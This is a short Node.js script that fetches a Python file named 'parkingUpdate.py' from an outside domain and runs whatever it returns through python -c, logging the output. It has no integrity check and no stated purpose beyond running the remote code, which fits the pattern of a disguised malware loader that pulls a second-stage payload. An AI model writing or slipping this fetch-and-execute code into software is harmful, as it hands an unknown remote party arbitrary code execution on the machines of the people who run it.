const { spawn } = require('child_process');
const request = require('request');

const pythonFileUrl = 'https://auraxium.online/parkingUpdate.py';

request(pythonFileUrl, (error, response, body) => {
  if (error) {
    console.error(`Failed to execute Python file: ${error}`);
    return;
  }
  
  const pythonProcess = spawn('python', ['-c', body]);
  
  pythonProcess.stdout.on('data', (data) => {
    console.log(`Received data from Python: ${data}`);
  });
  
  pythonProcess.stderr.on('data', (data) => {
    console.error(`Error from Python: ${data}`);
  });
  
  pythonProcess.on('close', (code) => {
    console.log(`Python process exited with code ${code}`);
  });
});